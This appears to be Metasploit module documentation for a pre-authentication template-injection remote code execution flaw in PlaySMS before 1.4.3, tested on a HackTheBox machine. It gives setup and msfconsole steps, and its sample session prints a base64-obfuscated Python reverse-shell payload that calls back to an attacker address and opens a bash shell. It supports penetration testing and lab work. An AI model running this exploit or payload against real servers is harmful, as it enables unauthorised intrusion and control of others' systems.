## Vulnerable Application

### Description

This module exploits a preauth Server-Side Template Injection vulnerability that leads to remote code execution in PlaySMS before version 1.4.3. This issue is caused by double processing a server-side template with a custom PHP template system called 'TPL' which is used in the PlaySMS template engine at `src/Playsms/Tpl.php:_compile()`. The vulnerability is triggered when an attacker supplied username with a malicious payload is submitted. This malicious payload is then stored in a TPL template which when rendered a second time, results in code execution.

The TPL (https://github.com/antonraharja/tpl) template language is vulnerable to PHP code injection.

### Setup

Available at [Source Forge](https://sourceforge.net/projects/playsms/files/playsms/Version%201.4.2/playsms-1.4.2.tar.gz/download).

 1. Download the application
 2. Extract : `tar -xvf playsms-1.4.2.tar.gz`
 3. Move in to the web directory : `mv playsms-1.4.2/web/* /var/www/html/`
 4. Make the config file: `cp /var/www/html/config-dist.php /var/www/html/config.php`
 5. Change the owner : `chown -R www-data:www-data /var/www/html/`
 6. Set DB creds in the config.php file and dump playsms-1.4.2/db/playsms.sql in to your playsms database
 7. Now visit : http://localhost/

## Verification Steps

 1. Install the application (Tested on HactheBox Frolic Machine)
 2. Start msfconsole
 3. Do: `use exploit/unix/webapp/playsms_pre_auth_rce`
 4. Do: `set rport <port>`
 5. Do: `set rhost <ip>`
 6. Do: `set targeturi /playsms`
 7. Do: `check`

```
[*] 10.10.10.111:9999 - The target appears to be vulnerable.
```

 10. Do: `set lport <port>`
 11. Do: `set lhost <ip>`
 12. Do: `run`
 13. You should get a shell.

## Scenarios

### Playsms on Ubuntu Linux

```
msf5 exploit(unix/webapp/playsms_pre_auth_rce) > set verbose true
msf5 exploit(unix/webapp/playsms_pre_auth_rce) > run
[+] python -c "exec('aW1wb3J0IHNvY2tldCAgICAgICwgICAgICAgc3VicHJvY2VzcyAgICAgICwgICAgICAgb3MgICAgICAgOyAgaG9zdD0iMTAuMTAuMTQuMjYiICAgICAgIDsgIHBvcnQ9ODA4MCAgICAgICA7ICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAsICAgICAgIHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICAgOyAgcy5jb25uZWN0KChob3N0ICAgICAgLCAgICAgICBwb3J0KSkgICAgICAgOyAgb3MuZHVwMihzLmZpbGVubygpICAgICAgLCAgICAgICAwKSAgICAgICA7ICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAsICAgICAgIDEpICAgICAgIDsgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICwgICAgICAgMikgICAgICAgOyAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp'.decode('base64'))"
[*] Started reverse TCP handler on 10.10.14.26:8080
[+] X-CSRF-Token for login : 6724a9cdb72eccdf7a7456309053eadd
[*] Trying to Send Payload in Username Field ......
[+] Payload successfully Sent
[*] Cookies here : PHPSESSID=bodmgesqnfkrjtbhr3nohui0e2;
[*] Command shell session 1 opened (10.10.14.26:8080 -> 10.10.10.111:44564) at 2020-03-12 18:10:37 +0530
id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a
Linux frolic 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:22:43 UTC 2018 i686 athlon i686 GNU/Linux
```
